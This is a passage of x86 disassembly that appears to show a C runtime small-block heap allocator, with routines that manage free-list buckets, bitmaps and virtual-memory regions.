  426876:	mov    ecx,ebx
  426878:	shr    esi,cl
  42687a:	not    esi
  42687c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426880:	dec    BYTE PTR [ebx+eax*1+0x4]
  426884:	jne    0x4268a7
  426886:	mov    ecx,DWORD PTR [ebp+0x8]
  426889:	and    DWORD PTR [ecx],esi
  42688b:	jmp    0x4268a7
  42688d:	lea    ecx,[ebx-0x20]
  426890:	shr    esi,cl
  426892:	not    esi
  426894:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42689b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42689f:	jne    0x4268a7
  4268a1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268a4:	and    DWORD PTR [ecx+0x4],esi
  4268a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268aa:	mov    esi,DWORD PTR [ecx+0x8]
  4268ad:	mov    ecx,DWORD PTR [ecx+0x4]
  4268b0:	mov    DWORD PTR [esi+0x4],ecx
  4268b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268b6:	mov    esi,DWORD PTR [ecx+0x4]
  4268b9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268bc:	mov    DWORD PTR [esi+0x8],ecx
  4268bf:	mov    esi,DWORD PTR [ebp+0xc]
  4268c2:	jmp    0x4268c7
  4268c4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268c7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268cb:	jne    0x4268d5
  4268cd:	cmp    ebx,edx
  4268cf:	je     0x426955
  4268d5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268d8:	lea    ecx,[ecx+edx*8]
  4268db:	mov    ebx,DWORD PTR [ecx+0x4]
  4268de:	mov    DWORD PTR [esi+0x8],ecx
  4268e1:	mov    DWORD PTR [esi+0x4],ebx
  4268e4:	mov    DWORD PTR [ecx+0x4],esi
  4268e7:	mov    ecx,DWORD PTR [esi+0x4]
  4268ea:	mov    DWORD PTR [ecx+0x8],esi
  4268ed:	mov    ecx,DWORD PTR [esi+0x4]
  4268f0:	cmp    ecx,DWORD PTR [esi+0x8]
  4268f3:	jne    0x426955
  4268f5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4268f9:	mov    BYTE PTR [ebp+0xf],cl
  4268fc:	inc    cl
  4268fe:	cmp    edx,0x20
  426901:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426905:	jae    0x42692c
  426907:	cmp    BYTE PTR [ebp+0xf],0x0
  42690b:	jne    0x42691b
  42690d:	mov    ecx,edx
  42690f:	mov    ebx,0x80000000
  426914:	shr    ebx,cl
  426916:	mov    ecx,DWORD PTR [ebp+0x8]
  426919:	or     DWORD PTR [ecx],ebx
  42691b:	mov    ebx,0x80000000
  426920:	mov    ecx,edx
  426922:	shr    ebx,cl
  426924:	lea    eax,[eax+edi*4+0x44]
  426928:	or     DWORD PTR [eax],ebx
  42692a:	jmp    0x426955
  42692c:	cmp    BYTE PTR [ebp+0xf],0x0
  426930:	jne    0x426942
  426932:	lea    ecx,[edx-0x20]
  426935:	mov    ebx,0x80000000
  42693a:	shr    ebx,cl
  42693c:	mov    ecx,DWORD PTR [ebp+0x8]
  42693f:	or     DWORD PTR [ecx+0x4],ebx
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    edx,0x80000000
  42694a:	shr    edx,cl
  42694c:	lea    eax,[eax+edi*4+0xc4]
  426953:	or     DWORD PTR [eax],edx
  426955:	mov    eax,DWORD PTR [ebp-0x4]
  426958:	mov    DWORD PTR [esi],eax
  42695a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42695e:	mov    eax,DWORD PTR [ebp-0x10]
  426961:	dec    DWORD PTR [eax]
  426963:	jne    0x426a60
  426969:	mov    eax,ds:0x45def8
  42696e:	test   eax,eax
  426970:	je     0x426a52
  426976:	mov    ecx,DWORD PTR ds:0x45df10
  42697c:	mov    esi,DWORD PTR ds:0x4290ac
  426982:	push   0x4000
  426987:	shl    ecx,0xf
  42698a:	add    ecx,DWORD PTR [eax+0xc]
  42698d:	mov    ebx,0x8000
  426992:	push   ebx
  426993:	push   ecx
  426994:	call   esi
  426996:	mov    ecx,DWORD PTR ds:0x45df10
  42699c:	mov    eax,ds:0x45def8
  4269a1:	mov    edx,0x80000000
  4269a6:	shr    edx,cl
  4269a8:	or     DWORD PTR [eax+0x8],edx
  4269ab:	mov    eax,ds:0x45def8
  4269b0:	mov    eax,DWORD PTR [eax+0x10]
  4269b3:	mov    ecx,DWORD PTR ds:0x45df10
  4269b9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269c1:	mov    eax,ds:0x45def8
  4269c6:	mov    eax,DWORD PTR [eax+0x10]
  4269c9:	dec    BYTE PTR [eax+0x43]
  4269cc:	mov    eax,ds:0x45def8
  4269d1:	mov    ecx,DWORD PTR [eax+0x10]
  4269d4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269d8:	jne    0x4269e3
  4269da:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269de:	mov    eax,ds:0x45def8
  4269e3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269e7:	jne    0x426a52
  4269e9:	push   ebx
  4269ea:	push   0x0
  4269ec:	push   DWORD PTR [eax+0xc]
  4269ef:	call   esi
  4269f1:	mov    eax,ds:0x45def8
  4269f6:	push   DWORD PTR [eax+0x10]
  4269f9:	push   0x0
  4269fb:	push   DWORD PTR ds:0x45e140
  426a01:	call   DWORD PTR ds:0x42902c
  426a07:	mov    eax,ds:0x45defc
  426a0c:	mov    edx,DWORD PTR ds:0x45df00
  426a12:	lea    eax,[eax+eax*4]
  426a15:	shl    eax,0x2
  426a18:	mov    ecx,eax
  426a1a:	mov    eax,ds:0x45def8
  426a1f:	sub    ecx,eax
  426a21:	lea    ecx,[ecx+edx*1-0x14]
  426a25:	push   ecx
  426a26:	lea    ecx,[eax+0x14]
  426a29:	push   ecx
  426a2a:	push   eax
  426a2b:	call   0x428280
  426a30:	mov    eax,DWORD PTR [ebp+0x8]
  426a33:	add    esp,0xc
  426a36:	dec    DWORD PTR ds:0x45defc
  426a3c:	cmp    eax,DWORD PTR ds:0x45def8
  426a42:	jbe    0x426a48
  426a44:	sub    DWORD PTR [ebp+0x8],0x14
  426a48:	mov    eax,ds:0x45df00
  426a4d:	mov    ds:0x45df08,eax
  426a52:	mov    eax,DWORD PTR [ebp+0x8]
  426a55:	mov    ds:0x45def8,eax
  426a5a:	mov    DWORD PTR ds:0x45df10,edi
  426a60:	pop    ebx
  426a61:	pop    edi
  426a62:	pop    esi
  426a63:	leave  
  426a64:	ret    
  426a65:	mov    eax,ds:0x45defc
  426a6a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a70:	push   edi
  426a71:	xor    edi,edi
  426a73:	cmp    eax,ecx
  426a75:	jne    0x426aab
  426a77:	lea    eax,[ecx+ecx*4+0x50]
  426a7b:	shl    eax,0x2
  426a7e:	push   eax
  426a7f:	push   DWORD PTR ds:0x45df00
  426a85:	push   edi
  426a86:	push   DWORD PTR ds:0x45e140
  426a8c:	call   DWORD PTR ds:0x4290d0
  426a92:	cmp    eax,edi
  426a94:	jne    0x426a9a
  426a96:	xor    eax,eax
  426a98:	pop    edi
  426a99:	ret    
  426a9a:	add    DWORD PTR ds:0x45df0c,0x10
  426aa1:	mov    ds:0x45df00,eax
  426aa6:	mov    eax,ds:0x45defc
  426aab:	mov    ecx,DWORD PTR ds:0x45df00
  426ab1:	push   esi
  426ab2:	push   0x41c4
  426ab7:	push   0x8
  426ab9:	push   DWORD PTR ds:0x45e140
  426abf:	lea    eax,[eax+eax*4]
  426ac2:	lea    esi,[ecx+eax*4]
  426ac5:	call   DWORD PTR ds:0x429030
  426acb:	cmp    eax,edi
  426acd:	mov    DWORD PTR [esi+0x10],eax
  426ad0:	jne    0x426ad6
  426ad2:	xor    eax,eax
  426ad4:	jmp    0x426b19
  426ad6:	push   0x4
  426ad8:	push   0x2000
  426add:	push   0x100000
  426ae2:	push   edi
  426ae3:	call   DWORD PTR ds:0x4290cc
  426ae9:	cmp    eax,edi
  426aeb:	mov    DWORD PTR [esi+0xc],eax
  426aee:	jne    0x426b02
  426af0:	push   DWORD PTR [esi+0x10]
  426af3:	push   edi
  426af4:	push   DWORD PTR ds:0x45e140
  426afa:	call   DWORD PTR ds:0x42902c
  426b00:	jmp    0x426ad2
  426b02:	or     DWORD PTR [esi+0x8],0xffffffff
  426b06:	mov    DWORD PTR [esi],edi
  426b08:	mov    DWORD PTR [esi+0x4],edi
  426b0b:	inc    DWORD PTR ds:0x45defc
  426b11:	mov    eax,DWORD PTR [esi+0x10]
  426b14:	or     DWORD PTR [eax],0xffffffff
  426b17:	mov    eax,esi
  426b19:	pop    esi
  426b1a:	pop    edi
  426b1b:	ret    
  426b1c:	push   ebp
  426b1d:	mov    ebp,esp
  426b1f:	push   ecx
  426b20:	push   ecx
  426b21:	mov    ecx,DWORD PTR [ebp+0x8]
  426b24:	mov    eax,DWORD PTR [ecx+0x8]
  426b27:	push   ebx
  426b28:	push   esi
  426b29:	mov    esi,DWORD PTR [ecx+0x10]
  426b2c:	push   edi
  426b2d:	xor    ebx,ebx
  426b2f:	jmp    0x426b34
  426b31:	shl    eax,1
  426b33:	inc    ebx
  426b34:	test   eax,eax
  426b36:	jge    0x426b31
  426b38:	mov    eax,ebx
  426b3a:	imul   eax,eax,0x204
  426b40:	lea    eax,[eax+esi*1+0x144]
  426b47:	push   0x3f
  426b49:	mov    DWORD PTR [ebp-0x8],eax
  426b4c:	pop    edx
  426b4d:	mov    DWORD PTR [eax+0x8],eax
  426b50:	mov    DWORD PTR [eax+0x4],eax
  426b53:	add    eax,0x8
  426b56:	dec    edx
  426b57:	jne    0x426b4d
  426b59:	push   0x4
  426b5b:	mov    edi,ebx
  426b5d:	push   0x1000
  426b62:	shl    edi,0xf
  426b65:	add    edi,DWORD PTR [ecx+0xc]
  426b68:	push   0x8000
  426b6d:	push   edi
  426b6e:	call   DWORD PTR ds:0x4290cc
  426b74:	test   eax,eax
  426b76:	jne    0x426b80
  426b78:	or     eax,0xffffffff
  426b7b:	jmp    0x426c1d
  426b80:	lea    edx,[edi+0x7000]
  426b86:	cmp    edi,edx
  426b88:	mov    DWORD PTR [ebp-0x4],edx
  426b8b:	ja     0x426bd0
  426b8d:	mov    ecx,edx
  426b8f:	sub    ecx,edi
  426b91:	shr    ecx,0xc
  426b94:	lea    eax,[edi+0x10]
  426b97:	inc    ecx
  426b98:	or     DWORD PTR [eax-0x8],0xffffffff
  426b9c:	or     DWORD PTR [eax+0xfec],0xffffffff
  426ba3:	lea    edx,[eax+0xffc]
  426ba9:	mov    DWORD PTR [eax],edx
  426bab:	lea    edx,[eax-0x1004]
  426bb1:	mov    DWORD PTR [eax-0x4],0xff0
  426bb8:	mov    DWORD PTR [eax+0x4],edx
  426bbb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bc5:	add    eax,0x1000
  426bca:	dec    ecx
  426bcb:	jne    0x426b98
  426bcd:	mov    edx,DWORD PTR [ebp-0x4]
  426bd0:	mov    eax,DWORD PTR [ebp-0x8]
  426bd3:	add    eax,0x1f8
  426bd8:	lea    ecx,[edi+0xc]
  426bdb:	mov    DWORD PTR [eax+0x4],ecx
  426bde:	mov    DWORD PTR [ecx+0x8],eax
  426be1:	lea    ecx,[edx+0xc]
  426be4:	mov    DWORD PTR [eax+0x8],ecx
  426be7:	mov    DWORD PTR [ecx+0x4],eax
  426bea:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bef:	xor    edi,edi
  426bf1:	inc    edi
  426bf2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426bf9:	mov    al,BYTE PTR [esi+0x43]
  426bfc:	mov    cl,al
  426bfe:	inc    cl
  426c00:	test   al,al
  426c02:	mov    eax,DWORD PTR [ebp+0x8]
  426c05:	mov    BYTE PTR [esi+0x43],cl
  426c08:	jne    0x426c0d
  426c0a:	or     DWORD PTR [eax+0x4],edi
  426c0d:	mov    edx,0x80000000
  426c12:	mov    ecx,ebx
  426c14:	shr    edx,cl
  426c16:	not    edx
  426c18:	and    DWORD PTR [eax+0x8],edx
  426c1b:	mov    eax,ebx
  426c1d:	pop    edi
  426c1e:	pop    esi
  426c1f:	pop    ebx
  426c20:	leave  
  426c21:	ret    
  426c22:	push   ebp
  426c23:	mov    ebp,esp
  426c25:	sub    esp,0xc
  426c28:	mov    ecx,DWORD PTR [ebp+0x8]
  426c2b:	mov    eax,DWORD PTR [ecx+0x10]
  426c2e:	push   ebx
  426c2f:	push   esi
  426c30:	mov    esi,DWORD PTR [ebp+0x10]
  426c33:	push   edi
  426c34:	mov    edi,DWORD PTR [ebp+0xc]
  426c37:	mov    edx,edi
  426c39:	sub    edx,DWORD PTR [ecx+0xc]
  426c3c:	add    esi,0x17
  426c3f:	shr    edx,0xf
  426c42:	mov    ecx,edx
  426c44:	imul   ecx,ecx,0x204
  426c4a:	lea    ecx,[ecx+eax*1+0x144]
  426c51:	mov    DWORD PTR [ebp-0xc],ecx
  426c54:	mov    ecx,DWORD PTR [edi-0x4]
  426c57:	and    esi,0xfffffff0
  426c5a:	dec    ecx
  426c5b:	cmp    esi,ecx
  426c5d:	lea    edi,[ecx+edi*1-0x4]
  426c61:	mov    ebx,DWORD PTR [edi]
  426c63:	mov    DWORD PTR [ebp+0x10],ecx
  426c66:	mov    DWORD PTR [ebp-0x4],ebx
  426c69:	jle    0x426dc4
  426c6f:	test   bl,0x1
  426c72:	jne    0x426dbd
  426c78:	add    ebx,ecx
  426c7a:	cmp    esi,ebx
  426c7c:	jg     0x426dbd
  426c82:	mov    ecx,DWORD PTR [ebp-0x4]
  426c85:	sar    ecx,0x4
  426c88:	dec    ecx
  426c89:	cmp    ecx,0x3f
  426c8c:	mov    DWORD PTR [ebp-0x8],ecx
  426c8f:	jbe    0x426c97
  426c91:	push   0x3f
  426c93:	pop    ecx
  426c94:	mov    DWORD PTR [ebp-0x8],ecx
  426c97:	mov    ebx,DWORD PTR [edi+0x4]
  426c9a:	cmp    ebx,DWORD PTR [edi+0x8]
  426c9d:	jne    0x426ce2
  426c9f:	cmp    ecx,0x20
  426ca2:	mov    ebx,0x80000000
  426ca7:	jae    0x426cc3
  426ca9:	shr    ebx,cl
  426cab:	mov    ecx,DWORD PTR [ebp-0x8]
  426cae:	lea    ecx,[ecx+eax*1+0x4]
  426cb2:	not    ebx
  426cb4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cb8:	dec    BYTE PTR [ecx]
  426cba:	jne    0x426ce2
  426cbc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cbf:	and    DWORD PTR [ecx],ebx
  426cc1:	jmp    0x426ce2
  426cc3:	add    ecx,0xffffffe0
  426cc6:	shr    ebx,cl
  426cc8:	mov    ecx,DWORD PTR [ebp-0x8]
  426ccb:	lea    ecx,[ecx+eax*1+0x4]
  426ccf:	not    ebx
  426cd1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426cd8:	dec    BYTE PTR [ecx]
  426cda:	jne    0x426ce2
  426cdc:	mov    ecx,DWORD PTR [ebp+0x8]
  426cdf:	and    DWORD PTR [ecx+0x4],ebx
  426ce2:	mov    ecx,DWORD PTR [edi+0x8]
  426ce5:	mov    ebx,DWORD PTR [edi+0x4]
  426ce8:	mov    DWORD PTR [ecx+0x4],ebx
  426ceb:	mov    ecx,DWORD PTR [edi+0x4]
  426cee:	mov    edi,DWORD PTR [edi+0x8]
  426cf1:	mov    DWORD PTR [ecx+0x8],edi
  426cf4:	mov    ecx,DWORD PTR [ebp+0x10]
  426cf7:	sub    ecx,esi
  426cf9:	add    DWORD PTR [ebp-0x4],ecx
  426cfc:	cmp    DWORD PTR [ebp-0x4],0x0
  426d00:	jle    0x426dab
  426d06:	mov    edi,DWORD PTR [ebp-0x4]
  426d09:	mov    ecx,DWORD PTR [ebp+0xc]
  426d0c:	sar    edi,0x4
  426d0f:	dec    edi
  426d10:	cmp    edi,0x3f
  426d13:	lea    ecx,[ecx+esi*1-0x4]
  426d17:	jbe    0x426d1c
  426d19:	push   0x3f
  426d1b:	pop    edi
  426d1c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d1f:	lea    ebx,[ebx+edi*8]
  426d22:	mov    DWORD PTR [ebp+0x10],ebx
  426d25:	mov    ebx,DWORD PTR [ebx+0x4]
  426d28:	mov    DWORD PTR [ecx+0x4],ebx
  426d2b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d2e:	mov    DWORD PTR [ecx+0x8],ebx
  426d31:	mov    DWORD PTR [ebx+0x4],ecx
  426d34:	mov    ebx,DWORD PTR [ecx+0x4]
  426d37:	mov    DWORD PTR [ebx+0x8],ecx
  426d3a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d3d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d40:	jne    0x426d99
  426d42:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d46:	mov    BYTE PTR [ebp+0x13],cl
  426d49:	inc    cl
  426d4b:	cmp    edi,0x20
  426d4e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d52:	jae    0x426d70
  426d54:	cmp    BYTE PTR [ebp+0x13],0x0
  426d58:	jne    0x426d68
  426d5a:	mov    ecx,edi
  426d5c:	mov    ebx,0x80000000
  426d61:	shr    ebx,cl
  426d63:	mov    ecx,DWORD PTR [ebp+0x8]
  426d66:	or     DWORD PTR [ecx],ebx
  426d68:	lea    eax,[eax+edx*4+0x44]
  426d6c:	mov    ecx,edi
  426d6e:	jmp    0x426d90
  426d70:	cmp    BYTE PTR [ebp+0x13],0x0
  426d74:	jne    0x426d86
  426d76:	lea    ecx,[edi-0x20]
  426d79:	mov    ebx,0x80000000
  426d7e:	shr    ebx,cl
  426d80:	mov    ecx,DWORD PTR [ebp+0x8]
  426d83:	or     DWORD PTR [ecx+0x4],ebx
  426d86:	lea    eax,[eax+edx*4+0xc4]
  426d8d:	lea    ecx,[edi-0x20]
  426d90:	mov    edx,0x80000000
  426d95:	shr    edx,cl
  426d97:	or     DWORD PTR [eax],edx
  426d99:	mov    edx,DWORD PTR [ebp+0xc]
  426d9c:	mov    ecx,DWORD PTR [ebp-0x4]
  426d9f:	lea    eax,[edx+esi*1-0x4]
  426da3:	mov    DWORD PTR [eax],ecx
  426da5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426da9:	jmp    0x426dae
  426dab:	mov    edx,DWORD PTR [ebp+0xc]
  426dae:	lea    eax,[esi+0x1]
  426db1:	mov    DWORD PTR [edx-0x4],eax
  426db4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426db8:	jmp    0x426ef9
  426dbd:	xor    eax,eax
  426dbf:	jmp    0x426efc
  426dc4:	jge    0x426ef9
  426dca:	mov    ebx,DWORD PTR [ebp+0xc]
  426dcd:	sub    DWORD PTR [ebp+0x10],esi
  426dd0:	lea    ecx,[esi+0x1]
  426dd3:	mov    DWORD PTR [ebx-0x4],ecx
  426dd6:	lea    ebx,[ebx+esi*1-0x4]
  426dda:	mov    esi,DWORD PTR [ebp+0x10]
  426ddd:	sar    esi,0x4
  426de0:	dec    esi
  426de1:	cmp    esi,0x3f
  426de4:	mov    DWORD PTR [ebp+0xc],ebx
  426de7:	mov    DWORD PTR [ebx-0x4],ecx
  426dea:	jbe    0x426def
  426dec:	push   0x3f
  426dee:	pop    esi
  426def:	test   BYTE PTR [ebp-0x4],0x1
  426df3:	jne    0x426e79
  426df9:	mov    esi,DWORD PTR [ebp-0x4]
  426dfc:	sar    esi,0x4
  426dff:	dec    esi
  426e00:	cmp    esi,0x3f
  426e03:	jbe    0x426e08
  426e05:	push   0x3f
  426e07:	pop    esi
  426e08:	mov    ecx,DWORD PTR [edi+0x4]
  426e0b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e0e:	jne    0x426e52
  426e10:	cmp    esi,0x20
  426e13:	mov    ebx,0x80000000
  426e18:	jae    0x426e33
  426e1a:	mov    ecx,esi
  426e1c:	shr    ebx,cl
  426e1e:	lea    esi,[esi+eax*1+0x4]
  426e22:	not    ebx
  426e24:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e28:	dec    BYTE PTR [esi]
  426e2a:	jne    0x426e4f
  426e2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e2f:	and    DWORD PTR [ecx],ebx
  426e31:	jmp    0x426e4f
  426e33:	lea    ecx,[esi-0x20]
  426e36:	shr    ebx,cl
  426e38:	lea    ecx,[esi+eax*1+0x4]
  426e3c:	not    ebx
  426e3e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e45:	dec    BYTE PTR [ecx]
  426e47:	jne    0x426e4f
  426e49:	mov    ecx,DWORD PTR [ebp+0x8]
  426e4c:	and    DWORD PTR [ecx+0x4],ebx
  426e4f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e52:	mov    ecx,DWORD PTR [edi+0x8]
  426e55:	mov    esi,DWORD PTR [edi+0x4]
  426e58:	mov    DWORD PTR [ecx+0x4],esi
  426e5b:	mov    esi,DWORD PTR [edi+0x8]
  426e5e:	mov    ecx,DWORD PTR [edi+0x4]
  426e61:	mov    DWORD PTR [ecx+0x8],esi
  426e64:	mov    esi,DWORD PTR [ebp+0x10]
  426e67:	add    esi,DWORD PTR [ebp-0x4]
  426e6a:	mov    DWORD PTR [ebp+0x10],esi
  426e6d:	sar    esi,0x4
  426e70:	dec    esi
  426e71:	cmp    esi,0x3f
  426e74:	jbe    0x426e79
  426e76:	push   0x3f
  426e78:	pop    esi
  426e79:	mov    ecx,DWORD PTR [ebp-0xc]
  426e7c:	lea    ecx,[ecx+esi*8]
  426e7f:	mov    edi,DWORD PTR [ecx+0x4]
  426e82:	mov    DWORD PTR [ebx+0x8],ecx
  426e85:	mov    DWORD PTR [ebx+0x4],edi
  426e88:	mov    DWORD PTR [ecx+0x4],ebx
  426e8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e8e:	mov    DWORD PTR [ecx+0x8],ebx
  426e91:	mov    ecx,DWORD PTR [ebx+0x4]
  426e94:	cmp    ecx,DWORD PTR [ebx+0x8]
  426e97:	jne    0x426ef0
  426e99:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426e9d:	mov    BYTE PTR [ebp+0xf],cl
  426ea0:	inc    cl
  426ea2:	cmp    esi,0x20
  426ea5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426ea9:	jae    0x426ec7
  426eab:	cmp    BYTE PTR [ebp+0xf],0x0
  426eaf:	jne    0x426ebf
  426eb1:	mov    ecx,esi
  426eb3:	mov    edi,0x80000000
  426eb8:	shr    edi,cl
  426eba:	mov    ecx,DWORD PTR [ebp+0x8]
  426ebd:	or     DWORD PTR [ecx],edi
  426ebf:	lea    eax,[eax+edx*4+0x44]
  426ec3:	mov    ecx,esi
  426ec5:	jmp    0x426ee7
  426ec7:	cmp    BYTE PTR [ebp+0xf],0x0
  426ecb:	jne    0x426edd
  426ecd:	lea    ecx,[esi-0x20]
  426ed0:	mov    edi,0x80000000
  426ed5:	shr    edi,cl
  426ed7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eda:	or     DWORD PTR [ecx+0x4],edi
  426edd:	lea    eax,[eax+edx*4+0xc4]
  426ee4:	lea    ecx,[esi-0x20]
  426ee7:	mov    edx,0x80000000
  426eec:	shr    edx,cl
  426eee:	or     DWORD PTR [eax],edx
  426ef0:	mov    eax,DWORD PTR [ebp+0x10]
  426ef3:	mov    DWORD PTR [ebx],eax
  426ef5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426ef9:	xor    eax,eax
  426efb:	inc    eax
  426efc:	pop    edi
  426efd:	pop    esi
  426efe:	pop    ebx
  426eff:	leave  
  426f00:	ret    
  426f01:	push   ebp
  426f02:	mov    ebp,esp
  426f04:	sub    esp,0x14
  426f07:	mov    ecx,DWORD PTR [ebp+0x8]
  426f0a:	mov    eax,ds:0x45defc
  426f0f:	mov    edx,DWORD PTR ds:0x45df00
  426f15:	add    ecx,0x17
  426f18:	and    ecx,0xfffffff0
  426f1b:	push   ebx
  426f1c:	mov    DWORD PTR [ebp-0x10],ecx
  426f1f:	sar    ecx,0x4
  426f22:	push   esi
  426f23:	lea    eax,[eax+eax*4]
  426f26:	push   edi
  426f27:	dec    ecx
  426f28:	cmp    ecx,0x20
  426f2b:	lea    edi,[edx+eax*4]
  426f2e:	mov    DWORD PTR [ebp-0x4],edi
  426f31:	jge    0x426f3e
  426f33:	or     esi,0xffffffff
  426f36:	shr    esi,cl
  426f38:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f3c:	jmp    0x426f4b
  426f3e:	add    ecx,0xffffffe0
  426f41:	or     eax,0xffffffff
  426f44:	xor    esi,esi
  426f46:	shr    eax,cl
  426f48:	mov    DWORD PTR [ebp-0x8],eax
  426f4b:	mov    eax,ds:0x45df08
  426f50:	mov    ebx,eax
  426f52:	mov    DWORD PTR [ebp-0xc],esi
  426f55:	cmp    ebx,edi
  426f57:	jmp    0x426f6d
  426f59:	mov    ecx,DWORD PTR [ebx+0x4]
  426f5c:	mov    edi,DWORD PTR [ebx]
  426f5e:	and    ecx,DWORD PTR [ebp-0x8]
  426f61:	and    edi,esi
  426f63:	or     ecx,edi
  426f65:	jne    0x426f72
  426f67:	add    ebx,0x14
  426f6a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f6d:	mov    DWORD PTR [ebp+0x8],ebx
  426f70:	jb     0x426f59
  426f72:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f75:	jne    0x426f9b
  426f77:	mov    ebx,edx
  426f79:	jmp    0x426f8c
  426f7b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f7e:	mov    edi,DWORD PTR [ebx]
  426f80:	and    ecx,DWORD PTR [ebp-0x8]
  426f83:	and    edi,esi
  426f85:	or     ecx,edi
  426f87:	jne    0x426f93
  426f89:	add    ebx,0x14
  426f8c:	cmp    ebx,eax
  426f8e:	mov    DWORD PTR [ebp+0x8],ebx
  426f91:	jb     0x426f7b
  426f93:	cmp    ebx,eax
  426f95:	je     0x42702f
  426f9b:	mov    DWORD PTR ds:0x45df08,ebx
  426fa1:	mov    eax,DWORD PTR [ebx+0x10]
  426fa4:	mov    edx,DWORD PTR [eax]
  426fa6:	cmp    edx,0xffffffff
  426fa9:	mov    DWORD PTR [ebp-0x4],edx
  426fac:	je     0x426fc2
  426fae:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fb5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fb9:	and    ecx,DWORD PTR [ebp-0x8]
  426fbc:	and    edi,esi
  426fbe:	or     ecx,edi
  426fc0:	jne    0x426ff8
  426fc2:	mov    edx,DWORD PTR [eax+0xc4]
  426fc8:	and    edx,DWORD PTR [ebp-0x8]
  426fcb:	and    DWORD PTR [ebp-0x4],0x0
  426fcf:	lea    ecx,[eax+0x44]
  426fd2:	mov    esi,DWORD PTR [ecx]
  426fd4:	and    esi,DWORD PTR [ebp-0xc]
  426fd7:	or     edx,esi
  426fd9:	mov    esi,DWORD PTR [ebp-0xc]
  426fdc:	jne    0x426ff5
  426fde:	mov    edx,DWORD PTR [ecx+0x84]
  426fe4:	and    edx,DWORD PTR [ebp-0x8]
  426fe7:	inc    DWORD PTR [ebp-0x4]
  426fea:	add    ecx,0x4
  426fed:	mov    edi,DWORD PTR [ecx]
  426fef:	and    edi,esi
  426ff1:	or     edx,edi
  426ff3:	je     0x426fde
  426ff5:	mov    edx,DWORD PTR [ebp-0x4]
  426ff8:	mov    ecx,edx
  426ffa:	imul   ecx,ecx,0x204
  427000:	lea    ecx,[ecx+eax*1+0x144]
  427007:	mov    DWORD PTR [ebp-0xc],ecx
  42700a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42700e:	xor    edi,edi
  427010:	and    ecx,esi
  427012:	jne    0x427081
  427014:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42701b:	and    ecx,DWORD PTR [ebp-0x8]
  42701e:	push   0x20
  427020:	pop    edi
  427021:	jmp    0x427081
  427023:	cmp    DWORD PTR [ebx+0x8],0x0
  427027:	jne    0x427034
  427029:	add    ebx,0x14
  42702c:	mov    DWORD PTR [ebp+0x8],ebx
  42702f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427032:	jb     0x427023
  427034:	cmp    ebx,DWORD PTR [ebp-0x4]
  427037:	jne    0x42705f
  427039:	mov    ebx,edx
  42703b:	jmp    0x427046
  42703d:	cmp    DWORD PTR [ebx+0x8],0x0
  427041:	jne    0x42704d
  427043:	add    ebx,0x14
  427046:	cmp    ebx,eax
  427048:	mov    DWORD PTR [ebp+0x8],ebx
  42704b:	jb     0x42703d
  42704d:	cmp    ebx,eax
  42704f:	jne    0x42705f
  427051:	call   0x426a65
  427056:	mov    ebx,eax
  427058:	test   ebx,ebx
  42705a:	mov    DWORD PTR [ebp+0x8],ebx
  42705d:	je     0x427077
  42705f:	push   ebx
  427060:	call   0x426b1c
  427065:	pop    ecx
  427066:	mov    ecx,DWORD PTR [ebx+0x10]
  427069:	mov    DWORD PTR [ecx],eax
  42706b:	mov    eax,DWORD PTR [ebx+0x10]
  42706e:	cmp    DWORD PTR [eax],0xffffffff
  427071:	jne    0x426f9b
  427077:	xor    eax,eax
  427079:	jmp    0x4271f8
  42707e:	shl    ecx,1
  427080:	inc    edi
  427081:	test   ecx,ecx
  427083:	jge    0x42707e
  427085:	mov    ecx,DWORD PTR [ebp-0xc]
  427088:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42708c:	mov    ecx,DWORD PTR [edx]
  42708e:	sub    ecx,DWORD PTR [ebp-0x10]
  427091:	mov    esi,ecx
  427093:	sar    esi,0x4
